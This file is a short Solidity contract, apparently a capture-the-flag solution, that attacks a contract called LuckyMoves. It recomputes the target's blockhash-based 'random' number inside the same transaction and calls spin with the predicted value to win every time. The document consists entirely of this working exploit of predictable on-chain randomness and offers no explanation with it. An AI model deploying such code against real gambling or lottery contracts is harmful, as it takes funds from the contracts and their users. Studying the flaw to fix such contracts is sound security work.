// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.8.0 <0.9.0;

import "./LuckyMoves.sol";

contract Solve {
    uint256 private constant MAXBET = 75149865395201;
    uint256 private seed;
    LuckyMoves luckyMoves;

    constructor(address _luckyMoves) {
        luckyMoves = LuckyMoves(_luckyMoves);
    }

    function rand(uint256 max) private view returns (uint256 result) {
        uint256 blockNum = block.number - (seed % 255);
        uint256 hashVal = uint256(blockhash(blockNum));
        return (uint256(hashVal) % max);
    }

    function exploit(uint256 _seed) public {
        seed = _seed;
        uint256 num = rand(MAXBET);
        luckyMoves.spin(num);
    }
}
